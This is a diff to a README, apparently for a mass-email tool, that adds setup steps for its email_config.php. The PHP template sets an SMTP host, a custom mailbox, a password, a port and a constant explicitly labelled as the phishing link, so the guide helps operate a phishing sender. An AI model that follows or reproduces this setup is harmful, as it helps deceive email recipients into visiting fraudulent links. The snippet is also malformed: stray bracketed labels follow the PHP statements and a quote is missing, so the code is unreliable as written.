@@ -26,4 +26,17 @@ Second you will need to create a custom email. You can do this in Cpanel just fi
 
 ![Settings](http://fakersent.com/22.PNG)
 
-## Configuring SMTP file.
+## Configuring email_config.php
+
+This one of the most simpliest things to do, all you have to do is copy and paste all info from SMTP settings. Enter password, and use email you created.
+
+```php
+<?php
+define("HOST","web server here"); [INCOMING SERVER]
+define("EMAIL","custom email"); [USERNAME]
+define("PASSWORD","password"); [PASSWORD]
+define("PORT","465"); [PORT]
+define("LINK", "http://linkhere.com); [PHISHING LINK]
+?>
+```
+
